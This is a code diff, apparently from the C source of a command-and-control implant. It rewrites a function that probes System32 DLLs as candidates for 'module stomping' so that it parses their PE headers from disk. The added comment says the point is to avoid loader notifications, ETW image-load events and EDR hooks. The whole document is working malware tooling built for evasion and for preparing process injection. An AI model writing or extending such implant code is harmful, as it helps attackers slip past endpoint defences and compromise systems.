@@ -588,6 +588,11 @@ static tlv_pkt_t *builtin_probe_stomp(c2_t *c2)
     /* Probe which DLLs from a candidate list exist on this system
      * and are suitable for module stomping.
      *
+     * Instead of LoadLibrary (which fires LdrDllNotification, ETW
+     * image-load events, and hits EDR hooks on LdrLoadDll), we read
+     * the PE headers straight from disk.  This is a plain file read
+     * — no module load, no loader callbacks, no kernel notification.
+     *
      * :in  string(TLV_TYPE_STRING): newline-delimited candidate DLL names
      * :out group(TLV_TYPE_GROUP)*:  one per valid candidate, each containing:
      *        string(TLV_TYPE_STRING) — DLL name
@@ -596,6 +601,8 @@ static tlv_pkt_t *builtin_probe_stomp(c2_t *c2)
      */
 
     char input[4096];
+    char sys_dir[MAX_PATH];
+    UINT sys_len;
     char *line;
     char *saveptr;
     tlv_pkt_t *result;
@@ -606,16 +613,24 @@ static tlv_pkt_t *builtin_probe_stomp(c2_t *c2)
         return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
     }
 
+    sys_len = GetSystemDirectoryA(sys_dir, sizeof(sys_dir));
+    if (sys_len == 0 || sys_len >= sizeof(sys_dir))
+    {
+        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
+    }
+
     result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
     for (line = strtok_r(input, "\n", &saveptr);
          line != NULL;
          line = strtok_r(NULL, "\n", &saveptr))
     {
-        HMODULE hMod;
-        PIMAGE_DOS_HEADER dos;
-        PIMAGE_NT_HEADERS nt;
-        SIZE_T img_size;
+        char path[MAX_PATH];
+        HANDLE hFile;
+        IMAGE_DOS_HEADER dos;
+        IMAGE_NT_HEADERS nt;
+        DWORD nread;
+        DWORD img_size;
 
         /* Skip leading whitespace / CR */
         while (*line == ' ' || *line == '\r')
@@ -627,15 +642,45 @@ static tlv_pkt_t *builtin_probe_stomp(c2_t *c2)
         if (GetModuleHandleA(line) != NULL)
             continue;
 
-        hMod = LoadLibraryA(line);
-        if (hMod == NULL)
+        /* Build full path: C:\Windows\System32\<dll> */
+        _snprintf(path, sizeof(path), "%s\\%s", sys_dir, line);
+        path[sizeof(path) - 1] = '\0';
+
+        hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
+                            NULL, OPEN_EXISTING,
+                            FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE)
             continue;
 
-        dos = (PIMAGE_DOS_HEADER)hMod;
-        nt  = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
-        img_size = nt->OptionalHeader.SizeOfImage;
+        /* Read DOS header */
+        if (!ReadFile(hFile, &dos, sizeof(dos), &nread, NULL) ||
+            nread != sizeof(dos) ||
+            dos.e_magic != IMAGE_DOS_SIGNATURE)
+        {
+            CloseHandle(hFile);
+            continue;
+        }
 
-        FreeLibrary(hMod);
+        /* Seek to NT headers */
+        if (SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN) ==
+            INVALID_SET_FILE_POINTER)
+        {
+            CloseHandle(hFile);
+            continue;
+        }
+
+        /* Read NT headers */
+        if (!ReadFile(hFile, &nt, sizeof(nt), &nread, NULL) ||
+            nread != sizeof(nt) ||
+            nt.Signature != IMAGE_NT_SIGNATURE)
+        {
+            CloseHandle(hFile);
+            continue;
+        }
+
+        CloseHandle(hFile);
+
+        img_size = nt.OptionalHeader.SizeOfImage;
 
         entry = tlv_pkt_create();
         tlv_pkt_add_string(entry, TLV_TYPE_STRING, line);
